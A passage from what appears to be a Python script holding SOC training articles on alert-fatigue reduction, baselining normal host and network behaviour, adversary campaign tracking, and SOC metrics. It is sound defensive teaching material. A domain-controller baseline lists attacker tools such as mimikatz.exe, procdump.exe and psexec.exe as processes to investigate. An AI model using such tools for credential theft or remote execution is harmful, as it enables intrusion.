| Duplicate alerts from multiple tools | Same event triggers EDR + SIEM + email alerts | Alert deduplication |
| No alert prioritization | All alerts treated equally | Triage framework |
| Insufficient automation | Analysts doing manual enrichment for every alert | SOAR / automation |
| Understaffing | More alerts than human capacity | Staffing or efficiency |
| Alert-per-event model | One alert per event instead of correlated incidents | Correlation rules |

---

## Strategy 1: Ruthless Rule Hygiene

### The Rule Audit

Every quarter, audit every active detection rule:

```
For each rule, calculate:
  - Alerts fired (last 90 days)
  - True positive rate
  - Mean time to triage
  - Escalation rate
  - Relevance to current threat model
```

### The Rule Classification

Place every rule into one of four categories:

| Category | Criteria | Action |
|----------|----------|--------|
| **Keep** | TP rate >30%, aligns with threat model | No change |
| **Tune** | TP rate 10-30%, generates actionable alerts after FP removal | Invest in tuning |
| **Automate** | TP rate <10% but pattern is well-understood | Auto-close or auto-enrich |
| **Retire** | TP rate <5%, no longer aligns with threat model | Disable |

**Target: Disable or automate at least 20% of rules each quarter.** New rules should be added only after proving value in testing.

### The One-In-One-Out Rule

For every new detection rule deployed, evaluate whether an existing low-value rule can be retired. This prevents unbounded rule growth.

---

## Strategy 2: Alert Tiering and Prioritization

Not all alerts deserve the same level of attention. Implement an alert tiering system:

### Tier 1: Immediate (Human Required)

- High-confidence detections (known low FP rate)
- Alerts on critical assets (DCs, financial systems, executive endpoints)
- Alerts matching active threat campaigns
- Correlated multi-signal alerts

**SLA:** Triage within 15 minutes.

### Tier 2: Standard (Human Required, Lower Priority)

- Medium-confidence detections
- Alerts on standard user endpoints
- Single-signal alerts with moderate relevance

**SLA:** Triage within 2 hours.

### Tier 3: Automated (Machine Handles, Human Reviews)

- Known-pattern false positives (auto-close with documentation)
- Informational alerts (log for trending, no individual triage)
- Alerts below confidence threshold (auto-enrich and re-score)

**SLA:** Reviewed in daily batch.

### Implementation in Your SIEM

```
# Pseudo-logic for alert tiering
if alert.rule_fidelity == "high" AND alert.asset_criticality >= "high":
    alert.tier = 1
    alert.sla_minutes = 15
elif alert.rule_fidelity == "high" OR alert.asset_criticality >= "high":
    alert.tier = 2
    alert.sla_minutes = 120
elif alert.rule_fidelity == "medium" AND alert.auto_enrichment_clean:
    alert.tier = 3
    alert.sla_minutes = 1440  # batch review
else:
    alert.tier = 2
    alert.sla_minutes = 120
```

---

## Strategy 3: Automation and Enrichment

The fastest way to reduce alert fatigue is to automate the repetitive parts of triage.

### What to Automate

| Task | Automation Approach | Impact |
|------|-------------------|--------|
| IOC reputation lookup | Auto-query VT, AbuseIPDB, TI feeds | Saves 2-3 min per alert |
| Asset context enrichment | Auto-pull CMDB data, user info, criticality | Saves 1-2 min per alert |
| Duplicate detection | Correlate alerts on same host/user within time window | Reduces volume 10-30% |
| Known-FP pattern matching | Auto-close alerts matching documented FP patterns | Reduces volume 20-40% |
| Alert grouping | Group related alerts into single investigation | Reduces mental overhead |

### What NOT to Automate

- **Containment actions** on production systems (require human approval)
- **Severity classification** beyond initial scoring (humans assess impact better)
- **Communication with stakeholders** (requires judgment and empathy)
- **Novel or unusual alerts** (these need human creativity)

### Simple Automation Example

```python
# Auto-enrichment pseudo-code
def enrich_alert(alert):
    # Add asset context
    alert.asset = cmdb_lookup(alert.host)
    alert.asset_criticality = alert.asset.criticality
    alert.asset_owner = alert.asset.owner

    # Add user context
    if alert.user:
        alert.user_info = ad_lookup(alert.user)
        alert.user_department = alert.user_info.department
        alert.user_vip = alert.user_info.is_vip

    # Check IOC reputation
    for ioc in alert.observables:
        ioc.reputation = ti_lookup(ioc.value, ioc.type)

    # Check for known FP pattern
    for pattern in known_fp_patterns:
        if pattern.matches(alert):
            alert.auto_disposition = "FP"
            alert.auto_disposition_reason = pattern.description
            alert.tier = 3
            return alert

    # Re-score based on enrichment
    alert.score = calculate_score(alert)
    alert.tier = assign_tier(alert.score)
    return alert
```

---

## Strategy 4: Analyst Workflow Optimization

### The Pomodoro Approach to Alert Triage

Instead of a continuous stream, batch alert triage:

```
25 min: Triage Tier 1 alerts (focused, no interruptions)
5 min: Break (stand up, get water)
25 min: Triage Tier 2 alerts
5 min: Break
25 min: Proactive work (tuning, hunting, documentation)
5 min: Break
Repeat
```

This structure prevents the "alert zombie" state where analysts mindlessly click through alerts.

### The Investigation Slot

Reserve 2-3 hours per shift for deep investigation work. During this time, one analyst handles routine triage while another digs into complex alerts. Rotate this role each shift.

### The Triage Buddy System

Pair analysts for triage review. Each analyst triages their queue but a partner spot-checks 10% of closed alerts. This catches missed TPs and provides coaching opportunities.

---

## Strategy 5: Feedback Loops

### From Analysts to Detection Engineering

Create a simple mechanism for analysts to flag problematic rules:

```
RULE FEEDBACK:
  Rule ID: DNS-001
  Feedback Type: [High FP / Missing Context / Unclear Description / Other]
  Details: "This rule fires 200+ times/day. 95% are CDN lookups.
           Needs CDN whitelist or domain age filter."
  Submitted by: analyst_jdoe
  Date: 2025-03-15
```

Track feedback volume per rule. Rules with 3+ feedback submissions in 30 days get mandatory review.

### From Incidents to Detection

After every confirmed incident, ask: "Did our alerts catch this? If not, why not? If yes, how can we make the alert more actionable?"

### From Metrics to Management

Report monthly to SOC management:

| Metric | This Month | Last Month | Trend |
|--------|-----------|------------|-------|
| Total alerts | 28,450 | 31,200 | Down 9% |
| Alerts per analyst per shift | 142 | 156 | Down 9% |
| Tier 1 alert volume | 2,845 | 3,120 | Down 9% |
| Overall FP rate | 68% | 74% | Improving |
| Mean time to triage (Tier 1) | 12 min | 14 min | Improving |
| Auto-closed (Tier 3) | 11,380 | 9,360 | Up 22% |
| Rules retired this month | 8 | 5 | Up |
| Rules tuned this month | 12 | 7 | Up |

---

## Strategy 6: Addressing the Human Side

Alert fatigue is not just a technical problem. It is a human problem.

### Signs of Analyst Burnout

- Closing alerts faster than investigation could reasonably take
- Decreased quality in triage notes
- Increased sick days or late arrivals
- Disengagement in team meetings
- Cynicism about alerting ("everything is a false positive")

### Interventions

- **Rotate responsibilities** -- do not keep the same analyst on alert triage every shift
- **Celebrate catches** -- publicly recognize when an analyst's careful triage caught a real incident
- **Invest in tools** -- if analysts are doing repetitive manual work, fix the tooling
- **Set realistic expectations** -- if the math says your team cannot triage the alert volume, that is a staffing or engineering problem, not a performance problem
- **Professional development time** -- dedicate 10-20% of shift time to training, research, or projects

---

## The 90-Day Alert Fatigue Reduction Plan

| Week | Focus | Target |
|------|-------|--------|
| 1-2 | Audit all rules, classify Keep/Tune/Automate/Retire | Complete rule inventory |
| 3-4 | Retire bottom 20% of rules by TP rate | 20% volume reduction |
| 5-6 | Implement alert tiering (Tier 1/2/3) | Analysts focus on high-value alerts |
| 7-8 | Deploy auto-enrichment for top 10 alert types | 2-3 min saved per alert |
| 9-10 | Implement known-FP auto-close patterns | 20% additional volume reduction |
| 11-12 | Tune remaining high-FP rules | FP rate below 40% |
| 13 | Measure results, adjust plan for next quarter | Documented improvement |

---

## References

- Ponemon Institute: "The Economics of Security Operations Centers"
- SANS: "Common and Best Practices for Security Operations Centers" (2019)
- "Burnout: The Secret to Unlocking the Stress Cycle" (Nagoski) -- understanding burnout
- Verizon DBIR (annual) -- detection time statistics
- MITRE: "11 Strategies of a World-Class Cybersecurity Operations Center"
"""
    ))

    # ---------- Article 14 ----------
    articles.append((
        "Baselining Normal Establishing What Clean Looks Like",
        ["soc-operations", "baselining", "threat-hunting", "detection-engineering"],
        r"""# Baselining Normal: Establishing What Clean Looks Like

## The Fundamental Problem

You cannot detect abnormal if you do not know what normal looks like. This is the single most overlooked capability in most SOCs. Analysts chase alerts all day but few can answer basic questions:

- What is the normal outbound data volume for this server?
- Which accounts typically log in at 3 AM?
- What processes normally run on a domain controller?
- How many DNS queries does a typical workstation make per hour?

Without baselines, every investigation starts from zero. With baselines, anomalies announce themselves.

---

## What to Baseline

### Network Baselines

| Metric | How to Measure | Why It Matters |
|--------|---------------|----------------|
| Outbound data volume per host per day | NetFlow / firewall logs | Detects exfiltration |
| DNS query volume per host per hour | DNS logs | Detects DNS tunneling, C2 beaconing |
| Unique external destinations per host | Proxy / firewall logs | Detects C2 diversity |
| Connection duration patterns | NetFlow | Detects long-lived C2 sessions |
| Protocol distribution per segment | NetFlow | Detects protocol tunneling |
| Internal lateral connection patterns | NetFlow / switch logs | Detects lateral movement |
| VPN connection times per user | VPN logs | Detects credential misuse |

### Endpoint Baselines

| Metric | How to Measure | Why It Matters |
|--------|---------------|----------------|
| Running processes per host type | EDR / Sysmon | Detects malware, LOLBins |
| Services and scheduled tasks | EDR / Sysmon | Detects persistence |
| Software installed per host type | CMDB / EDR | Detects unauthorized software |
| User login times per account | Windows Security logs | Detects compromised accounts |
| PowerShell usage per host | Script Block Logging | Detects attacker tooling |
| Local admin account activity | Windows Security logs | Detects privilege abuse |
| Autostart locations | EDR / Sysmon Registry events | Detects persistence mechanisms |

### Identity Baselines

| Metric | How to Measure | Why It Matters |
|--------|---------------|----------------|
| Login locations per user | Auth logs + GeoIP | Detects impossible travel |
| Login times per user | Auth logs | Detects off-hours access |
| Service account behavior | Auth logs | Detects abuse of service accounts |
| MFA failure rate per user | IAM logs | Detects MFA fatigue attacks |
| Group membership changes | AD audit logs | Detects privilege escalation |
| Password reset patterns | AD audit logs | Detects account takeover prep |

### Application Baselines

| Metric | How to Measure | Why It Matters |
|--------|---------------|----------------|
| Database query patterns | DB audit logs | Detects data theft / SQL injection |
| API call volumes and patterns | API gateway logs | Detects abuse and scraping |
| Email sending volumes per user | Email gateway logs | Detects compromised accounts |
| File access patterns per user | File server audit logs | Detects insider threats |

---

## How to Build a Baseline

### Step 1: Select a Clean Period

Choose a time period that represents normal operations:

- **Duration:** At least 30 days (captures weekly cycles); 90 days is better
- **Cleanliness:** No known incidents during this period
- **Representativeness:** Includes typical business activity, not just holidays or quiet periods
- **Verify:** Run your detection rules against the period -- any alerts should be confirmed benign

### Step 2: Collect and Aggregate Data

For each metric, calculate statistical properties:

```python
# Example: Baseline outbound data volume per host
import statistics

def build_baseline(daily_volumes):
    '''Build baseline stats from list of daily volume measurements.'''
    return {
        "mean": statistics.mean(daily_volumes),
        "median": statistics.median(daily_volumes),
        "stdev": statistics.stdev(daily_volumes),
        "p95": sorted(daily_volumes)[int(len(daily_volumes) * 0.95)],
        "p99": sorted(daily_volumes)[int(len(daily_volumes) * 0.99)],
        "min": min(daily_volumes),
        "max": max(daily_volumes),
        "sample_size": len(daily_volumes),
    }

# Example output for FILE-SRV-01:
# mean: 2.3 GB/day, stdev: 0.8 GB, p95: 3.9 GB, p99: 5.1 GB
# A day with 8 GB outbound would be 7+ standard deviations above the mean
```

### Step 3: Segment by Entity Type

One baseline does not fit all. Segment by:

- **Host role:** Domain controllers behave differently from workstations
- **User role:** IT admins have different patterns from sales staff
- **Time of day:** Business hours vs. off-hours
- **Day of week:** Monday patterns differ from Saturday patterns
- **Department:** Finance has different data flows than engineering

```
BASELINE: Outbound Data Volume (GB/day)

| Host Role        | Mean  | StDev | P95   | Alert Threshold |
|-----------------|-------|-------|-------|-----------------|
| Workstation     | 0.5   | 0.3   | 1.1   | > 2.0 GB        |
| File Server     | 2.3   | 0.8   | 3.9   | > 6.0 GB        |
| Web Server      | 45.0  | 12.0  | 65.0  | > 90.0 GB       |
| Domain Controller | 0.1 | 0.05  | 0.2   | > 0.5 GB        |
| Database Server | 0.3   | 0.2   | 0.7   | > 1.5 GB        |
```

### Step 4: Set Thresholds

Choose detection thresholds based on your baseline statistics:

| Threshold Method | Formula | Sensitivity |
|-----------------|---------|-------------|
| Fixed percentile | Alert if value > P99 | Moderate -- catches top 1% |
| Standard deviation | Alert if value > mean + 3*stdev | Statistical -- adjusts to data shape |
| Percentage change | Alert if value > 200% of mean | Simple -- easy to explain |
| Peer comparison | Alert if value > 3x peer group P95 | Context-aware |

**Recommendation:** Start with mean + 3 standard deviations and adjust based on false positive feedback.

### Step 5: Monitor and Refine

Baselines are not static. Re-calculate monthly to account for:

- Business growth (more users, more data, more hosts)
- Infrastructure changes (new applications, new servers, cloud migration)
- Seasonal patterns (end-of-quarter financial activity, holiday staffing)

---

## Process Baselines: Know Your Gold Images

For critical server types, maintain a "known good" reference:

### Domain Controller Process Baseline

```
NORMAL PROCESSES ON DOMAIN CONTROLLER (Windows Server 2022):
  System processes: System, smss.exe, csrss.exe, wininit.exe, services.exe,
                    lsass.exe, svchost.exe (multiple instances), lsm.exe
  AD services: ntds.exe, dfsrs.exe, dns.exe, ismserv.exe
  Management: ServerManager.exe (if GUI), mmc.exe (during admin sessions)
  Security tools: [Your EDR agent], [Your AV agent]
  Monitoring: [Your monitoring agent]

ABNORMAL (investigate immediately):
  - powershell.exe running as SYSTEM without GPO justification
  - cmd.exe spawned by services other than expected management tools
  - Any executable in C:\Users\, C:\Temp\, C:\Windows\Temp\
  - python.exe, perl.exe, cscript.exe, wscript.exe
  - procdump.exe, mimikatz.exe, psexec.exe, or renamed variants
  - Any process making outbound internet connections
```

### Critical Server Services Baseline

```
FILE-SRV-01 Expected Services:
  [x] LanmanServer (running, auto)
  [x] LanmanWorkstation (running, auto)
  [x] DFSR (running, auto)
  [x] [EDR Service] (running, auto)
  [x] [Backup Agent] (running, auto)

  Any additional services = INVESTIGATE
  Any missing services = INVESTIGATE
  Service binary path changes = CRITICAL ALERT
```

---

## Hunting with Baselines

Baselines are your most powerful threat hunting tool. Common hunt patterns:

### First-Time Execution Hunt

```
# Find processes that have never run on this host before
current_processes = get_processes(host, today)
baseline_processes = get_baseline_processes(host, 90_days)
new_processes = current_processes - baseline_processes

# Review new_processes for suspicious entries
for proc in new_processes:
    check_hash(proc.hash)
    check_path(proc.path)
    check_signer(proc.certificate)
```

### Anomalous Connection Volume Hunt

```
# Find hosts with unusually high outbound connection counts
for host in all_hosts:
    today_connections = count_outbound(host, today)
    baseline = get_baseline(host, "outbound_connections")
    if today_connections > baseline.mean + 3 * baseline.stdev:
        flag_for_review(host, today_connections, baseline)
```

### Off-Hours Activity Hunt

```
# Find user accounts active outside their normal hours
for user in all_users:
    current_logins = get_login_times(user, today)
    normal_hours = get_baseline_hours(user)
    for login in current_logins:
        if login.time not in normal_hours:
            flag_for_review(user, login)
```

---

## Common Pitfalls

### Building Baselines During Incidents
If there is active malicious activity during your baseline period, you will baseline the attack as normal. Verify the baseline period is clean.

### One Baseline for All
A workstation is not a server. An intern is not a sysadmin. Segment your baselines or they will be too broad to detect anything.

### Baseline and Forget
Networks change. Applications change. User behavior changes. A baseline from 6 months ago may not represent today's normal. Rebuild monthly.

### Overly Sensitive Thresholds
Setting alert thresholds at mean + 1 stdev will flood you with alerts. Start at 3 stdev and tighten only where false negatives are a concern.

### Ignoring the Long Tail
Some baselines follow power-law distributions, not normal distributions. A few hosts legitimately transfer large volumes (backup servers, media servers). Segment these out before calculating thresholds.

---

## Baseline Health Metrics

| Metric | Target | Review |
|--------|--------|--------|
| Percentage of critical assets with process baselines | 100% | Monthly |
| Percentage of network segments with traffic baselines | 100% | Monthly |
| Baseline age (oldest baseline still in use) | <90 days | Monthly |
| Anomaly detection FP rate | <20% | Monthly |
| Anomaly detection coverage (% of assets monitored) | >80% | Quarterly |

---

## References

- MITRE ATT&CK: Data source coverage for baselining
- SANS SEC511: Continuous Monitoring and Security Operations -- baselining
- "The Practice of Network Security Monitoring" (Bejtlich) -- establishing baselines
- CIS Benchmarks -- expected configurations as a form of baseline
- NSA/CISA: Network Infrastructure Security Guidance -- baseline configurations
"""
    ))

    # ---------- Article 15 ----------
    articles.append((
        "Tracking Adversary Campaigns Across Multiple Incidents",
        ["threat-intelligence", "campaign-tracking", "incident-response", "attribution"],
        r"""# Tracking Adversary Campaigns Across Multiple Incidents

## Why Campaign Tracking Matters

Individual incidents are data points. Campaigns are the pattern that connects them. When you track campaigns, you shift from reactive (responding to each incident in isolation) to proactive (anticipating the adversary's next move based on their established pattern).

Campaign tracking answers questions that individual incident investigation cannot:

- Is this the same adversary who hit us three months ago?
- Are they targeting us specifically, or are we collateral in a broader campaign?
- What is their objective across multiple intrusions?
- What can we expect them to do next?
- Are other organizations in our sector seeing the same activity?

---

## Defining a Campaign

A campaign is a set of related adversary activities that share common attributes:

| Linking Attribute | Example | Reliability |
|------------------|---------|-------------|
| Shared infrastructure | Same C2 servers, same domain registrant | High (but can be shared) |
| Shared malware | Same malware family, same builder configuration | High |
| Shared TTPs | Same attack chain, same unique techniques | High (most durable) |
| Shared targeting | Same sector, same geography, same org type | Medium (many adversaries target same sectors) |
| Temporal clustering | Incidents occurring in same timeframe | Low (coincidence possible) |
| Shared victimology | Same department/role targeted across orgs | Medium |

**The strongest campaign links combine 3+ attributes.** A single shared IP address is not enough; a shared IP + same malware family + same attack chain is compelling.

---

## The Campaign Tracking Framework

### Step 1: Create a Campaign Hypothesis

When you see patterns across incidents, document the hypothesis:

```
CAMPAIGN HYPOTHESIS: ShadowLedger

HYPOTHESIS: A financially motivated threat actor is conducting a sustained
campaign against financial services organizations, using compromised
vendor software as the initial access vector.

SUPPORTING EVIDENCE:
  - INC-2025-0142 (our incident): Supply chain compromise via payroll vendor
  - FS-ISAC report 2025-031: Two other banks reported similar payroll vendor compromise
  - Shared IOC: Same C2 domain pattern (random-word.random-word.xyz)
  - Shared TTP: DLL side-loading of msdtc.exe in all three incidents
  - Shared targeting: All victims are mid-size financial institutions

CONFIDENCE: Medium-High
ANALYST: jdoe
DATE: 2025-03-20
```

### Step 2: Build the Campaign Database

For each linked incident, create a structured record:

```markdown
# Campaign: ShadowLedger

## Linked Incidents

| Incident | Date | Victim | Access Vector | Outcome | Source |
|----------|------|--------|---------------|---------|--------|
| INC-2025-0142 | 2025-03-14 | Us | Supply chain (payroll vendor) | Contained, data exfil suspected | Internal |
| ISAC-2025-031a | 2025-03-10 | Bank A | Supply chain (same vendor) | Data breach confirmed | FS-ISAC |
| ISAC-2025-031b | 2025-03-12 | Bank B | Supply chain (same vendor) | Contained pre-exfil | FS-ISAC |
| OSINT-2025-044 | 2025-03-18 | Credit Union | Unknown, similar IOCs | Under investigation | Twitter |

## Shared IOCs

| IOC | Type | Seen In | First Seen | Last Seen |
|-----|------|---------|------------|-----------|
| cdn-static[.]xyz | domain | INC-142, ISAC-031a | 2025-03-08 | 2025-03-14 |
| update-service[.]xyz | domain | ISAC-031b | 2025-03-11 | 2025-03-12 |
| 198.51.100.44 | IPv4 | INC-142, ISAC-031a | 2025-03-10 | 2025-03-14 |
| SHA256:a1b2c3... | file hash | INC-142, ISAC-031a, ISAC-031b | 2025-03-08 | 2025-03-14 |

## Shared TTPs (ATT&CK Mapping)

| Technique | Description | Seen In | Unique to Campaign? |
|-----------|-------------|---------|---------------------|
| T1195.002 | Supply chain compromise | All 4 | Medium (not unique but consistent) |
| T1574.002 | DLL side-loading (msdtc.exe) | INC-142, ISAC-031a, ISAC-031b | High (specific binary choice) |
| T1059.001 | PowerShell encoded commands | All 4 | Low (very common) |
| T1041 | Exfiltration over C2 | INC-142, ISAC-031a | Low (common) |
| T1560.001 | Archive collected data (.7z) | INC-142, ISAC-031a | Medium (specific tool choice) |

## Adversary Profile

- **Motivation:** Financial (targeting payroll/financial data)
- **Capability:** Moderate-High (supply chain compromise, custom malware)
- **Targeting:** Mid-size US financial institutions
- **Operating hours:** UTC-5 to UTC-8 business hours (North/South America)
- **Infrastructure:** Domains registered via NameCheap, .xyz TLD preference
```

### Step 3: Predictive Analysis

Based on the campaign pattern, predict what the adversary will do next:

```
PREDICTIONS:
  1. Additional victims: Other clients of the same payroll vendor are likely
     compromised. Recommend vendor issue advisory and all clients audit.
  2. Infrastructure rotation: The adversary will likely register new C2 domains
     within 7-14 days as current ones are burned. Pattern: two random English
     words + .xyz TLD, NameCheap registrar.
  3. TTP consistency: Expect continued use of DLL side-loading with
     legitimate Windows binaries. May switch from msdtc.exe to another
     target binary.
  4. Escalation: If data exfiltration is confirmed, expect possible extortion
     attempt within 30-60 days.
```

### Step 4: Share and Collaborate

Campaign intelligence is most valuable when shared:

- **Internal:** Brief SOC team, CISO, and relevant business units
- **ISAC/ISAO:** Share IOCs and TTPs through your industry ISAC (use TLP:AMBER for specifics, TLP:GREEN for general patterns)
- **MISP:** Publish a MISP event with campaign attributes
- **Vendor:** Notify your security vendors so they can create detections for other customers

---

## Linking Techniques in Practice

### Infrastructure Overlap Analysis

Build a graph of infrastructure connections:

```
Incident A: victim --> domain1.xyz --> IP-1
Incident B: victim --> domain2.xyz --> IP-1  (shared IP)
Incident C: victim --> domain3.xyz --> IP-2
            domain3.xyz registered by same email as domain1.xyz (shared registrant)

Conclusion: A, B, and C share infrastructure
```

Tools for this:
- WHOIS/passive DNS pivoting (DomainTools, RiskIQ/Microsoft Defender TI)
- Maltego for visual link analysis
- MISP for structured relationship storage

### Malware Family Analysis

When you have samples from multiple incidents:

```
Sample A (INC-142): SHA256:aaa..., Cobalt Strike, config: watermark=305419896
Sample B (ISAC-031a): SHA256:bbb..., Cobalt Strike, config: watermark=305419896
Sample C (ISAC-031b): SHA256:ccc..., Cobalt Strike, config: watermark=305419896

Same watermark = same Cobalt Strike license = almost certainly same operator
```

### TTP Fingerprinting

Some adversary behaviors are distinctive enough to serve as fingerprints:

- Specific tool combinations (e.g., Mimikatz + Rubeus + SharpHound always together)
- Unique command-line patterns (specific flags, specific order of operations)
- Distinctive infrastructure setup (e.g., always using LetsEncrypt certs, always .xyz TLD)
- Operational timing (consistently active during specific hours)
- Specific data staging and exfiltration methods

---

## Campaign Lifecycle Management

### Active Campaign

The campaign is ongoing and new incidents are being linked.

**Actions:**
- Daily review of new alerts for campaign IOCs
- Weekly update of campaign database
- Active sharing with ISAC and peer organizations
- Detection rules specifically targeting campaign TTPs
- Proactive hunting for campaign artifacts in your environment

### Dormant Campaign

No new activity for 30+ days but the adversary has not been disrupted.

**Actions:**
- Keep campaign detections active
- Monthly check for new IOCs from TI sources
- Monitor for infrastructure reuse
- Campaign IOCs remain on watchlist with extended expiry

### Closed Campaign

The adversary is disrupted (arrested, infrastructure seized) or the campaign is no longer relevant.

**Actions:**
- Archive campaign database for historical reference
- Review detections for retirement
- Document lessons learned
- Use campaign data for training exercises

---

## Campaign Correlation Checklist

When investigating a new incident, check for campaign links:

- [ ] Search all IOCs against your campaign database
- [ ] Compare TTPs against known campaign profiles
- [ ] Check ISAC and TI sources for similar activity
- [ ] Compare malware family, config, and builder artifacts
- [ ] Check infrastructure registration patterns (registrar, TLD, creation dates)
- [ ] Compare targeting profile (sector, geography, department)
- [ ] Check for temporal correlation with other recent incidents
- [ ] If Cobalt Strike: compare watermarks and malleable C2 profiles
- [ ] If phishing: compare email templates, sending infrastructure, themes

---

## Tools for Campaign Tracking

| Tool | Use Case | Cost |
|------|----------|------|
| MISP | Structured threat event storage with relationships | Free (self-hosted) |
| OpenCTI | Graph-based campaign and adversary tracking | Free (self-hosted) |
| Maltego | Visual link analysis between IOCs and campaigns | Free Community / Paid |
| Analyst1 | Automated campaign linking and tracking | Paid |
| MITRE ATT&CK Navigator | Visual TTP overlap comparison | Free |
| Spreadsheets | Simple campaign tracking for small teams | Free |

---

## References

- MITRE ATT&CK: Groups and campaigns
- Diamond Model of Intrusion Analysis (Caltagirone, Pendergast, Betz)
- "Intelligence-Driven Incident Response" (Reese & Roberts) -- campaign analysis
- FIRST.org: Traffic Light Protocol for intelligence sharing
- STIX 2.1: Campaign and intrusion set objects for structured sharing
"""
    ))

    # ---------- Article 16 ----------
    articles.append((
        "SOC Metrics That Actually Matter",
        ["soc-operations", "metrics", "kpi", "management", "continuous-improvement"],
        r"""# SOC Metrics That Actually Matter

## The Metrics Problem in SOCs

Most SOCs measure the wrong things. They count alerts closed, tickets processed, and hours worked. These are activity metrics -- they tell you how busy the team is, not how effective it is.

A SOC that closes 10,000 alerts per month but misses the one real breach has great activity metrics and catastrophic outcomes. The goal is to measure what matters: **are we effectively detecting and responding to threats, and are we getting better over time?**

---

## The Three Categories of SOC Metrics

### Category 1: Detection Effectiveness

These metrics answer: "Are we finding threats?"

#### Mean Time to Detect (MTTD)

**Definition:** Average time between the start of malicious activity and the generation of an alert.

**How to measure:** For each confirmed incident, calculate:
```
MTTD = Time of first SOC alert - Time of initial compromise
```

**Target:** Depends on threat type:

| Threat Type | Good MTTD | Excellent MTTD |
|------------|-----------|----------------|
| Malware execution | < 1 hour | < 15 minutes |
| Account compromise | < 4 hours | < 1 hour |
| Data exfiltration | < 24 hours | < 4 hours |
| Insider threat | < 7 days | < 48 hours |
| Advanced persistent threat | < 30 days | < 7 days |

**Why it matters:** Dwell time is the strongest predictor of breach impact. Every hour an attacker operates undetected increases the blast radius.

**Pitfall:** MTTD can only be calculated for detected incidents. It says nothing about threats you never found. Complement with detection coverage metrics.

#### Detection Coverage

**Definition:** Percentage of MITRE ATT&CK techniques for which you have at least one detection rule.

**How to measure:**
1. Identify the ATT&CK techniques relevant to your threat model (not all 200+)
2. Map your detection rules to ATT&CK techniques
3. Calculate: Coverage = (Techniques with detections / Relevant techniques) * 100

**Visualization:** Use the ATT&CK Navigator to create a heatmap:

```
ATT&CK Coverage by Tactic:

Initial Access:    [#####-----] 50%
Execution:         [########--] 80%
Persistence:       [######----] 60%
Privilege Escal:   [#####-----] 50%
Defense Evasion:   [###-------] 30%
Credential Access: [#######---] 70%
Discovery:         [####------] 40%
Lateral Movement:  [######----] 60%
Collection:        [##--------] 20%
Exfiltration:      [###-------] 30%
Command & Control: [########--] 80%
Impact:            [#####-----] 50%
```

**Target:** >70% coverage for techniques used by your top 5 threat actors.

#### Alert Fidelity

**Definition:** Percentage of alerts that represent actual security events (true positive rate).

**How to measure:**
```
Alert Fidelity = (True Positives + True Positive Informational) / Total Alerts * 100
```

**Target:** >30% overall. High-fidelity rules should be >70%.

**Breakdown by rule is more useful than aggregate:**

| Rule | Alerts/Month | TP Rate | Action |
|------|-------------|---------|--------|
| EDR: Ransomware Behavior | 12 | 83% | Keep as-is |
| SIEM: Suspicious PowerShell | 3,400 | 4% | Needs major tuning |
| SIEM: Brute Force | 890 | 22% | Moderate tuning |
| EDR: Lateral Movement | 45 | 67% | Keep, minor tuning |

### Category 2: Response Effectiveness

These metrics answer: "Are we responding well to threats?"

#### Mean Time to Respond (MTTR)

**Definition:** Average time from alert to containment of the threat.

**How to measure:**
```
MTTR = Time threat contained - Time of first alert
```

Components of MTTR:
```
MTTR = Time to Triage + Time to Investigate + Time to Contain

Where:
  Time to Triage = First analyst action - Alert creation
  Time to Investigate = Investigation complete - First analyst action
  Time to Contain = Containment action - Investigation complete
```

**Target:**

| Severity | Triage | Investigate | Contain | Total MTTR |
|----------|--------|-------------|---------|------------|
| SEV-1 | 15 min | 1 hour | 30 min | < 2 hours |
| SEV-2 | 1 hour | 4 hours | 2 hours | < 8 hours |
| SEV-3 | 4 hours | 24 hours | 8 hours | < 36 hours |

**Why it matters:** Fast response limits impact. A ransomware infection contained in 30 minutes affects 3 hosts. The same infection contained in 4 hours affects 300.

#### Containment Effectiveness

**Definition:** Percentage of incidents where containment actions successfully stopped the adversary from achieving their objective.

**How to measure:** Post-incident, assess:
- Did the attacker achieve their goal (data theft, ransomware deployment, etc.)?
- Did containment prevent further spread?
- Did the attacker regain access after initial containment?

**Target:** >90% of incidents contained before adversary achieves primary objective.

#### Escalation Accuracy

**Definition:** Percentage of Tier 1 escalations that are confirmed as valid by Tier 2.

**How to measure:**
```
Escalation Accuracy = Valid Escalations / Total Escalations * 100
```

**Target:** 30-50%. Lower means over-escalation (Tier 1 is not filtering enough). Higher may mean under-escalation (Tier 1 is closing things that should be escalated).

### Category 3: Operational Health

These metrics answer: "Is our SOC sustainable and improving?"

#### Alert Volume and Trend

**Definition:** Total alerts per day/week/month with trend over time.

**What matters:** The trend, not the absolute number. Alert volume should be stable or declining as you tune rules. Spikes need explanation (new rules, new log sources, or actual increase in threats).

```
Alert Volume Trend (Daily Average):

Jan: ||||||||||||||||||||| 2,100
Feb: ||||||||||||||||||| 1,900  (tuning sprint)
Mar: |||||||||||||||||| 1,800
Apr: |||||||||||||||| 1,600    (retired 15 rules)
May: ||||||||||||||| 1,500
Jun: ||||||||||||||||| 1,700   (new log source onboarded)
```

#### Analyst Utilization

**Definition:** Percentage of analyst time spent on meaningful security work vs. overhead.

**Breakdown:**
```
Healthy Analyst Time Allocation:

Alert Triage:           40%   (necessary but optimize)
Deep Investigation:     25%   (high-value work)
Threat Hunting:         15%   (proactive detection)
Tuning & Engineering:   10%   (force multiplier)
Training & Development: 10%   (sustainability)
```

**Red flags:**
- Triage > 70% -- alert volume problem, needs tuning/automation
- Investigation < 10% -- analysts are stuck in triage; complex alerts get insufficient attention
- Hunting = 0% -- fully reactive SOC; no proactive capability
- Training = 0% -- skills stagnation; analysts will burn out or leave

#### Analyst Retention and Satisfaction

**Definition:** Turnover rate and satisfaction scores for SOC analysts.

**Why it matters:** Experienced analysts are your most valuable asset. High turnover destroys institutional knowledge and increases dwell time (new analysts miss things experienced analysts would catch).

**Metrics:**
- Annual turnover rate (target: <20%)
- Average tenure (target: >2 years)
- Quarterly satisfaction survey (target: >3.5/5.0)
- Training hours per analyst per quarter (target: >20 hours)

---

## The SOC Dashboard

Build a monthly dashboard with these core metrics:

```
+----------------------------------------------------------+
| SOC MONTHLY DASHBOARD -- March 2025                      |
+----------------------------------------------------------+
|                                                          |
| DETECTION             | RESPONSE            | HEALTH    |
| MTTD: 3.2 hrs (v)    | MTTR: 6.1 hrs (v)  | Alerts/day: 1,500 (v) |
| Coverage: 62% (^)     | Containment: 94%    | FP Rate: 38% (v)      |
| Fidelity: 34% (^)     | Escal Accuracy: 42% | Utilization: Healthy   |
|                                                          |
| TRENDS                                                   |
| - MTTD improved 18% vs last month (new DNS detection)   |
| - Alert volume down 12% (rule retirement sprint)         |
| - One missed detection: lateral movement via WMI         |
